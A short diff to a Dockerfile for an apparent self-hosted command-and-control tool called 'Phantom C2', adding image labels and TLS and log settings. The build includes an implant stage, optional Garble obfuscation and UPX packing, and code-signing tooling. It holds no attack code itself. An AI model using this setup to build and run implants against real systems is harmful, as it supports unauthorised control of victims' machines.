@@ -25,12 +25,17 @@ RUN cd implant && \
 # ---------- stage 2: runtime ----------
 FROM golang:1.24-bookworm
 
+LABEL org.opencontainers.image.title="Phantom C2" \
+      org.opencontainers.image.description="Self-hosted C2 with encrypted beacon, binder and dashboard" \
+      org.opencontainers.image.source="https://github.com/abdulmanan69/botnt"
+
 ARG INSTALL_GARBLE=0
 ARG INSTALL_UPX=0
 
 ENV PYTHONUNBUFFERED=1 PYTHONDONTWRITEBYTECODE=1 \
     CGO_ENABLED=0 GOTOOLCHAIN=local GOFLAGS=-mod=mod \
-    PHANTOM_DATA=/data PHANTOM_BUILDS=/data/builds PHANTOM_PORT=80 PHANTOM_HOST=0.0.0.0
+    PHANTOM_DATA=/data PHANTOM_BUILDS=/data/builds PHANTOM_PORT=80 PHANTOM_HOST=0.0.0.0 \
+    PHANTOM_TLS=false PHANTOM_LOG=info
 
 RUN apt-get update \
  && apt-get install -y --no-install-recommends python3 python3-venv ca-certificates curl unzip osslsigncode \
